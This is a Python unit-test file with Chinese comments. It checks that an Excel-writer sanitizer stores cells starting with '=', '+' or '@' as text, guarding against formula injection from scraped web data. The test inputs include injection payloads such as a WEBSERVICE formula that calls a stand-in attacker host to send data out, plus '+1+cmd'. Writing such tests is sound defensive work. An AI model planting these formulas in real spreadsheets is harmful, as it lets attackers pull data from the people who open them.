"""Excel 公式注入防护单测（backend/app/tools/excel_writer_tool.py）。

数据源可能是抓取的网页内容，'=' 开头单元格会被 openpyxl 自动推断为公式，
Excel/WPS 打开后求值（=WEBSERVICE 外带数据）。防护方式：强制文本类型写出。
"""
from io import BytesIO

from openpyxl import Workbook, load_workbook

from app.tools.excel_writer_tool import _sanitize_formula_cells


def test_formula_cells_forced_to_text():
    wb = Workbook()
    ws = wb.active
    ws.append(["=WEBSERVICE(\"http://evil.example/x\")", "普通文本", "+1+cmd", "@SUM(A1)", 42])

    fixed = _sanitize_formula_cells(ws)

    assert fixed == 3  # '='、'+'、'@' 三个危险前缀（纯数字与普通文本不动）
    assert ws["A1"].data_type == "s"


def test_saved_file_roundtrip_keeps_formula_as_string():
    wb = Workbook()
    ws = wb.active
    ws.append(["=HYPERLINK(\"http://evil.example\")", "b"])
    _sanitize_formula_cells(ws)

    buf = BytesIO()
    wb.save(buf)
    buf.seek(0)
    wb2 = load_workbook(buf)
    cell = wb2.active["A1"]

    # 读取回来是字符串单元格而非公式单元格（'f'）——Excel 打开不求值
    assert cell.data_type == "s"
    assert cell.value == "=HYPERLINK(\"http://evil.example\")"


def test_clean_data_untouched():
    wb = Workbook()
    ws = wb.active
    ws.append(["姓名", 25, 3.14, None])
    fixed = _sanitize_formula_cells(ws)
    assert fixed == 0
    assert ws["B1"].value == 25
